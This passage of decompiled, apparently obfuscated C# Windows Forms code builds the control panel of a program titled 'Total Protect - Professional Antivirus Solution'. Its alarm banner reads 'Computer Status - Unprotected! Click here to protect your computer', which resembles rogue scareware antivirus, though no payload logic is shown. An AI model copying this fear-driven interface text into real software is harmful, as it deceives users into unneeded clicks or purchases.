		((Control)btnScan).set_BackColor(Color.FromArgb(73, 73, 73));
		((Control)btnScan).set_BackgroundImage((Image)componentResourceManager.GetObject("btnScan.BackgroundImage"));
		((ButtonBase)btnScan).set_FlatStyle((FlatStyle)0);
		((Control)btnScan).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnScan).set_ForeColor(Color.White);
		((Control)btnScan).set_Location(new Point(17, 0));
		((Control)btnScan).set_Name("btnScan");
		((Control)btnScan).set_Size(new Size(143, 34));
		((Control)btnScan).set_TabIndex(3);
		((Control)btnScan).set_Text("Scan");
		((ButtonBase)btnScan).set_UseVisualStyleBackColor(false);
		((Control)btnScan).add_Click((EventHandler)btnScan_Click);
		((Control)pictureBox5).set_BackColor(Color.Transparent);
		pictureBox5.set_Image((Image)componentResourceManager.GetObject("pictureBox5.Image"));
		((Control)pictureBox5).set_Location(new Point(31, 162));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(93, 111));
		pictureBox5.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox5.set_TabIndex(10);
		pictureBox5.set_TabStop(false);
		((Control)btnSettings).set_BackColor(Color.FromArgb(73, 73, 73));
		((Control)btnSettings).set_BackgroundImage((Image)componentResourceManager.GetObject("btnSettings.BackgroundImage"));
		((ButtonBase)btnSettings).set_FlatStyle((FlatStyle)0);
		((Control)btnSettings).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnSettings).set_ForeColor(Color.White);
		((Control)btnSettings).set_Location(new Point(17, 40));
		((Control)btnSettings).set_Name("btnSettings");
		((Control)btnSettings).set_Size(new Size(143, 34));
		((Control)btnSettings).set_TabIndex(4);
		((Control)btnSettings).set_Text("Settings");
		((ButtonBase)btnSettings).set_UseVisualStyleBackColor(false);
		((Control)btnSettings).add_Click((EventHandler)lblCompStatus_Click);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(179, 197));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(57, 53));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(10);
		pictureBox1.set_TabStop(false);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Highlight);
		((Control)label6).set_Location(new Point(606, 235));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(151, 15));
		((Control)label6).set_TabIndex(9);
		((Control)label6).set_Text("Change my scan schedule");
		((Control)label6).add_Click((EventHandler)lblCompStatus_Click);
		((Control)label6).add_MouseLeave((EventHandler)label6_MouseLeave);
		((Control)label6).add_MouseHover((EventHandler)label6_MouseHover);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.FromArgb(108, 52, 82));
		((Control)label5).set_Location(new Point(371, 235));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(10, 15));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text("|");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.FromArgb(73, 73, 73));
		((Control)label4).set_Location(new Point(385, 237));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(195, 13));
		((Control)label4).set_TabIndex(7);
		((Control)label4).set_Text("Friday around 6:00 AM (Full Scan)");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.FromArgb(108, 52, 82));
		((Control)label3).set_Location(new Point(265, 258));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(235, 15));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Last Scan: No scheduled scan performed.");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.FromArgb(108, 52, 82));
		((Control)label2).set_Location(new Point(265, 235));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(100, 15));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Scheduled Scan:");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(73, 73, 73));
		((Control)label1).set_Location(new Point(265, 200));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(81, 14));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Scan Details");
		((Control)panel1).set_BackgroundImage((Image)(object)Class3.smethod_23());
		panel1.method_5(Color.Empty);
		((Control)panel1).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)panel1).set_Dock((DockStyle)1);
		panel1.method_7(0f);
		panel1.method_1(Color.Empty);
		panel1.method_3(Color.Empty);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(874, 26));
		((Control)panel1).set_TabIndex(0);
		((Control)panel1).add_Click((EventHandler)lblCompStatus_Click);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(19, 5));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(459, 16));
		((Control)lblCompStatus).set_TabIndex(0);
		((Control)lblCompStatus).set_Text("Computer Status - Unprotected! Click here to protect your computer.");
		((Control)lblCompStatus).add_Click((EventHandler)lblCompStatus_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(244, 244, 244));
		((Form)this).set_ClientSize(new Size(874, 462));
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ControlPanel");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).set_Text("Total Protect - Professional Antivirus Solution");
		((Form)this).add_FormClosing(new FormClosingEventHandler(ControlPanel_FormClosing));
		((Control)this).add_Enter((EventHandler)ControlPanel_Enter);
		((Control)this).add_Resize((EventHandler)ControlPanel_Resize);
		((Control)panel2).ResumeLayout(false);
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)panel4).ResumeLayout(false);
		((Control)panel4).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)panel5).ResumeLayout(false);
		((Control)panel5).PerformLayout();
		((Control)panel6).ResumeLayout(false);
		((Control)panel6).PerformLayout();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
